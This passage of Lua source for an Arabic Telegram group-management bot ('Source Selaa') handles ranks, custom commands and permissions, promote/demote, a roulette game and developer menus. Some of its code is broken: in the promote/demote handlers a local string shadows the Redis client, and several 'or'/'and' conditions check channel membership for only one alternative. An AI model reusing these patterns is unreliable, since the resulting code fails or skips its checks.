elseif tonumber(msgs) < 500 then 
MsgText = 'غير متفاعل' 
elseif tonumber(msgs) < 750 then 
MsgText = 'متوسط' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'متفاعل' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ملك التفاعل'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'اسطورة التفاعل' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'متفاعل نار' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'يجدح جدح' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'خيالي' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'رب التفاعل' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'كافر بالتفاعل' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "معلك لربك" 
end 
return MsgText
end
--     Source Selaa     --
function absmoned(chat_id, user_id, msg_id, text, offset, length) local tt = Selaa:get(Selaa..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source Selaa     --
function SourceCh(msg) 
local url,res = https.request('https://apiabs.ml/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.ChatMember.Selaa ~= true then
Var = false
send(msg.chat_id_,msg.id_,'['..data.ChatMember.Selaa..']')   
else
Var = true
end
return Var
end
--     Source Selaa     --
function ChCheck(msg)
local var = true 
if Selaa:get(Selaa.."Selaa2") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..Selaa:get(Selaa..'Selaa2')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if Selaa:get(Selaa..'Selaa:textch:user') then
local textchuser = Selaa:get(Selaa..'Selaa:textch:user')
send(msg.chat_id_,msg.id_,'['..textchuser..']')
else
send(msg.chat_id_,msg.id_,"↯☆عليك الاشتراك في قناة البوت \n↯☆قناة البوت ⇇ ["..Selaa:get(Selaa..'Selaa3').."]")
end
elseif data.ok then
return var
end
else
return var
end
end
chats = {}
function tdcli_update_callback(data)
if data.ID == "UpdateNewCallbackQuery" then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and Selaa:get(Selaa..'yes'..data.sender_user_id_) == 'delyes' then
Selaa:del(Selaa..'yes'..data.sender_user_id_, 'delyes')
Selaa:del(Selaa..'no'..data.sender_user_id_, 'delno')
if RankChecking(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "↯☆لا استطيع طرد ⇇ "..IdRank(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "↯☆ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "↯☆البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "↯☆لا استطيع طرد مشرفين المجموعه") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "↯☆تم طردك من المجموعه") 
return false
end
end,nil)  
end
if DataText == '/delno' and Selaa:get(Selaa..'no'..data.sender_user_id_) == 'delno' then
Selaa:del(Selaa..'yes'..data.sender_user_id_, 'delyes')
Selaa:del(Selaa..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "↯☆تم الغاء امر اطردني") 
end
--     Source Selaa     --
if DataText == '/yesdel' and Selaa:get(Selaa..'yesdel'..data.sender_user_id_) == 'delyes' then
Selaa:del(Selaa..'yesdel'..data.sender_user_id_, 'delyes')
Selaa:del(Selaa..'nodel'..data.sender_user_id_, 'delno')
if Selaa:sismember(Selaa..'Selaa:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if Selaa:sismember(Selaa..'Selaa:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if Selaa:sismember(Selaa..'Selaa:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if Selaa:sismember(Selaa..'Selaa:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if Selaa:sismember(Selaa..'Selaa:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if Selaa:sismember(Selaa..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if Selaa:sismember(Selaa..'Selaa:Constructor:'..data.chat_id_, data.sender_user_id_) or Selaa:sismember(Selaa..'Selaa:Managers:'..data.chat_id_, data.sender_user_id_) or Selaa:sismember(Selaa..'Selaa:Admins:'..data.chat_id_, data.sender_user_id_) or Selaa:sismember(Selaa..'Selaa:VipMem:'..data.chat_id_, data.sender_user_id_) or Selaa:sismember(Selaa..'Selaa:Cleaner:'..data.chat_id_, data.sender_user_id_) or Selaa:sismember(Selaa..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
Selaa:srem(Selaa..'Selaa:Constructor:'..data.chat_id_,data.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Managers:'..data.chat_id_,data.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Admins:'..data.chat_id_,data.sender_user_id_)
Selaa:srem(Selaa..'Selaa:VipMem:'..data.chat_id_,data.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Cleaner:'..data.chat_id_,data.sender_user_id_)
Selaa:srem(Selaa..'User:Donky:'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "↯☆تم تنزيلك من ⇇ ⤈\n~ ( "..constructor..''..Managers..''..admins..''..vipmem..''..cleaner..''..donky.." ) ~ \n") 
else 
if IdRank(data.sender_user_id_, data.chat_id_) == 'العضو' then
EditMsg(Chat_Id2, Msg_Id2, "↯☆ليس لديك رتبه في البوت") 
else 
EditMsg(Chat_Id2, Msg_Id2, "↯☆لا استطيع تنزيل ⇇ "..IdRank(data.sender_user_id_, data.chat_id_)) 
end
end
end
if DataText == '/nodel' and Selaa:get(Selaa..'nodel'..data.sender_user_id_) == 'delno' then
Selaa:del(Selaa..'yesdel'..data.sender_user_id_, 'delyes')
Selaa:del(Selaa..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "↯☆تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and Selaa:get(Selaa.."Selaa:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local list = Selaa:smembers(Selaa..'Selaa:ListRolet'..data.chat_id_) 
local UserName = list[math.random(#list)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
Selaa:incrby(Selaa..'Selaa:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
Selaa:del(Selaa..'Selaa:ListRolet'..data.chat_id_) 
Selaa:del(Selaa.."Selaa:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "↯☆*صاحب الحظ* ⇇ ["..UserName.."]\n↯☆*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
Selaa:del(Selaa..'Selaa:ListRolet'..data.chat_id_) 
Selaa:del(Selaa.."Selaa:NumRolet"..data.chat_id_..data.sender_user_id_) 
Selaa:del(Selaa.."Selaa:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "↯☆تم الغاء اللعبه لاعادة اللعب ارسل الالعاب") 
end
if DataText == '/ListRolet' then
local list = Selaa:smembers(Selaa..'Selaa:ListRolet'..data.chat_id_) 
local Text = '↯☆قائمة الاعبين ⇇ ⤈\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n' 
local Textt = '┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆تم اكتمال العدد الكلي هل انت مستعد ؟'
for k, v in pairs(list) do 
Text = Text..k.."~ : [" ..v.."]\n"  
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if data.ID == "UpdateNewMessage" then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = data.message_.content_.text_
if text and Selaa:get(Selaa.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = Selaa:get(Selaa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
Selaa:del(Selaa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
Selaa:del(Selaa.."Set:Cmd:Group:New"..msg.chat_id_)
Selaa:srem(Selaa.."List:Cmd:Group:New"..msg.chat_id_,text)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حذف الامر من المجموعه", 1, 'html')  
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆لايوجد امر بهذا الاسم", 1, 'html')
end
Selaa:del(Selaa.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(Selaa:get(Selaa..'Selaa:NameBot') or "سيلا")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(Selaa:get(Selaa..'Selaa:NameBot') or "سيلا")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = Selaa:get(Selaa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and Selaa:get(Selaa.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
Selaa:set(Selaa.."Set:Cmd:Group:New"..msg.chat_id_,text)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل الامر الجديد", 1, 'html')
Selaa:del(Selaa.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
Selaa:set(Selaa.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and Selaa:get(Selaa.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = Selaa:get(Selaa.."Set:Cmd:Group:New"..msg.chat_id_)
Selaa:set(Selaa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
Selaa:sadd(Selaa.."List:Cmd:Group:New"..msg.chat_id_,text)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حفظ الامر", 1, 'html')
Selaa:del(Selaa.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local list = Selaa:smembers(Selaa.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "↯☆قائمة الاوامر المضافه ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
Cmds = Selaa:get(Selaa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..""..k.."~ ("..v..") \n"
end
end
if #list == 0 then
t = "↯☆لايوجد اوامر مضافه في المجموعه"
end
Selaa(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الاوامر المضافه" or text == "حذف الاوامر" or text == "مسح الاوامر المضافه" and ChCheck(msg) then
local list = Selaa:smembers(Selaa.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
Selaa:del(Selaa.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
Selaa:del(Selaa.."List:Cmd:Group:New"..msg.chat_id_)
end
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حذف الاوامر المضافه في المجموعه", 1, 'html')
end
if text == "اضف امر" or text == "اضافة امر" or text == "اضافه امر" and ChCheck(msg) then
Selaa:set(Selaa.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" or text == "مسح امر" and ChCheck(msg) then 
Selaa:set(Selaa.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
return false
end
end
--     Source Selaa     --
if text == "الصلاحيات" or text == "صلاحيات" and ChCheck(msg) then 
local list = Selaa:smembers(Selaa.."Coomds"..msg.chat_id_)
if #list == 0 then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆لاتوجد صلاحيات مضافه", 1, 'html')
return false
end
t = "↯☆قائمة الصلاحيات المضافه ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
var = Selaa:get(Selaa.."Comd:New:rt:Selaa:"..v..msg.chat_id_)
if var then
t = t..""..k.."~ "..v.." • ("..var..")\n"
else
t = t..""..k.."~ "..v.."\n"
end
end
Selaa(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg) then
if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
local list = Selaa:smembers(Selaa.."Coomds"..msg.chat_id_)
for k,v in pairs(list) do
Selaa:del(Selaa.."Comd:New:rt:Selaa:"..v..msg.chat_id_)
Selaa:del(Selaa.."Coomds"..msg.chat_id_)
end
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حذف الصلاحيات المضافه", 1, 'html')
end
end
if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
Selaa:set(Selaa.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
Selaa:sadd(Selaa.."Coomds"..msg.chat_id_,ComdNew)  
Selaa:setex(Selaa.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n↯☆ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
Selaa:del(Selaa.."Comd:New:rt:Selaa:"..ComdNew..msg.chat_id_)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حذف الصلاحيه", 1, 'html')
end
if Selaa:get(Selaa.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم الغاء الامر", 1, 'html')
Selaa:del(Selaa.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تستطيع اضافة صلاحية ( عضو • مميز  • ادمن )\n↯☆ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not Manager(msg) then 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تستطيع اضافة صلاحية ( عضو • مميز )\n↯☆ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not Admin(msg) then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تستطيع اضافة صلاحية ( عضو )\n↯☆ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = Selaa:get(Selaa.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
Selaa:set(Selaa.."Comd:New:rt:Selaa:"..textn..msg.chat_id_,text)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم اضافة الصلاحيه", 1, 'html')
Selaa:del(Selaa.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
local Selaa = text:match("رفع (.*)")
if Selaa:sismember(Selaa.."Coomds"..msg.chat_id_,Selaa) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = Selaa:get(Selaa.."Comd:New:rt:Selaa:"..Selaa..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sourcesela')..')'..' ❩\n↯☆تم رفعه ❨ '..Selaa..' ❩ بنجاح', 1, 'md')
Selaa:set(Selaa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,Selaa) 
Selaa:sadd(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "ادمن" and Admin(msg) then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sourcesela')..')'..' ❩\n↯☆تم رفعه ❨ '..Selaa..' ❩ بنجاح', 1, 'md')
Selaa:set(Selaa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,Selaa)
Selaa:sadd(Selaa..'Selaa:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "مدير" and Manager(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sourcesela')..')'..' ❩\n↯☆تم رفعه ❨ '..Selaa..' ❩ بنجاح', 1, 'md')
Selaa:set(Selaa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,Selaa)  
Selaa:sadd(Selaa..'Selaa:Managers:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "عضو" then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sourcesela')..')'..' ❩\n↯☆تم رفعه ❨ '..Selaa..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
local Selaa = text:match("تنزيل (.*)")
if Selaa:sismember(Selaa.."Coomds"..msg.chat_id_,Selaa) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = Selaa:get(Selaa.."Comd:New:rt:Selaa:"..Selaa..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sourcesela')..')'..' ❩\n↯☆تم تنزيله ❨ '..Selaa..' ❩ بنجاح', 1, 'md')
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.sender_user_id_)
Selaa:del(Selaa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "ادمن" and Admin(msg) then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sourcesela')..')'..' ❩\n↯☆تم تنزيله ❨ '..Selaa..' ❩ بنجاح', 1, 'md')
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.sender_user_id_)
Selaa:del(Selaa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "مدير" and Manager(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sourcesela')..')'..' ❩\n↯☆تم تنزيله ❨ '..Selaa..' ❩ بنجاح', 1, 'md')
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_, result.sender_user_id_)
Selaa:del(Selaa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "عضو" then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sourcesela')..')'..' ❩\n↯☆تم تنزيله ❨ '..Selaa..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") and ChCheck(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if Selaa:sismember(Selaa.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = Selaa:get(Selaa.."Comd:New:rt:Selaa:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sourcesela')..')'..' ❩\n↯☆تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
Selaa:sadd(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.id_)
Selaa:set(Selaa.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "ادمن" and Admin(msg) then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sourcesela')..')'..' ❩\n↯☆تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
Selaa:sadd(Selaa..'Selaa:Admins:'..msg.chat_id_, result.id_)
Selaa:set(Selaa.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "مدير" and Manager(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sourcesela')..')'..' ❩\n↯☆تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
Selaa:sadd(Selaa..'Selaa:Managers:'..msg.chat_id_, result.id_)
Selaa:set(Selaa.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "عضو" then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sourcesela')..')'..' ❩\n↯☆تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") and ChCheck(msg) then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if Selaa:sismember(Selaa.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = Selaa:get(Selaa.."Comd:New:rt:Selaa:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sourcesela')..')'..' ❩\n↯☆تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.id_)
Selaa:del(Selaa.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "ادمن" and Admin(msg) then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sourcesela')..')'..' ❩\n↯☆تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.id_)
Selaa:del(Selaa.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "مدير" and Manager(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sourcesela')..')'..' ❩\n↯☆تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_, result.id_)
Selaa:del(Selaa.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "عضو" then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو ⇇ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sourcesela')..')'..' ❩\n↯☆تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     Source Selaa     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
Selaa:incr(Selaa..'Selaa:UsersMsgs'..Selaa..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
Selaa:incr(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not Selaa:sismember(Selaa.."Selaa:Users",msg.chat_id_) then
Selaa:sadd(Selaa.."Selaa:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     Source Selaa     --
if ChatType == 'pv' then 
if text == '/start' or text == 'رجوع ،🔙‘' then 
if Sudo(msg) then 
local Sudo_Welcome = '↯☆مرحبا عزيزي المطور \n↯☆انت المطور الاساسي هنا \n↯☆اليك ازرار سورس سيلاسيلا \n↯☆تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'وضع اسم البوت','⇇ تحديث ⌁','وضع كليشه المطور'},
{'⇇ المطورين ⌁','⇇ الاحصائيات ⌁'},
{'⇇ المجموعات ⌁','روابط الجروبات','⇇ المشتركين ⌁'},
{'⇇ تعطيل التواصل ⌁','⇇ تفعيل التواصل ⌁'},
{'تنظيف الجروبات','⇇ قائمه العام ⌁','تنظيف المشتركين'},
{'تعطيل ترحيب البوت','تفعيل ترحيب البوت'},
{'⇇ تغير معلومات الترحيب ⌁'},
{'⇇ تعطيل المغادره ⌁','⇇ تفعيل المغادره ⌁'},
{'⇇ تعطيل الاذاعه ⌁','⇇ تفعيل الاذاعه ⌁'},
{'⇇ اذاعه بالتثبيت ⌁'},
{'⇇ اذاعه عام ⌁','⇇ اذاعه خاص ⌁'},
{'⇇ اذاعه عام بالتوجيه ⌁','⇇ اذاعه خاص بالتوجيه ⌁'},
{'~ تعيين كلايش الاوامر ~'},
{'تعطيل البوت الخدمي','تفعيل البوت الخدمي'},
{'جلب نسخه السورس','تحديث السورس','جلب نسخه الجروبات'},
{'⇇ حذف رد عام ⌁','⇇ الردود العام ⌁','⇇ اضف رد عام ⌁'},
{'⇇ حذف رد الخاص ⌁','⇇ تعيين رد الخاص ⌁'},
{'حذف قناة الاشتراك','قناة الاشتراك','تعيين قناة الاشتراك'},
{'حذف كليشه الاشتراك','كليشه الاشتراك','تغير كليشه الاشتراك'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '~ تعيين كلايش الاوامر ~' then 
if Sudo(msg) then 
local Sudo_Welcome = '↯☆اهلا بك مجددا عزيزي المطور \n↯☆اليك الازرار الخاصه بتعديل وتغيير كلايش سورس سيلاسيلا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'حذف كليشة الايدي','تعيين كليشة الايدي'},
{'تعيين امر الاوامر'},
{'تعيين امر م3','تعيين امر م2','تعيين امر م1'},
{'تعيين امر م6','تعيين امر م5','تعيين امر م4'},
{'استعادة كلايش الاوامر'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '/start' then  
if not Selaa:get(Selaa..'Selaa:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
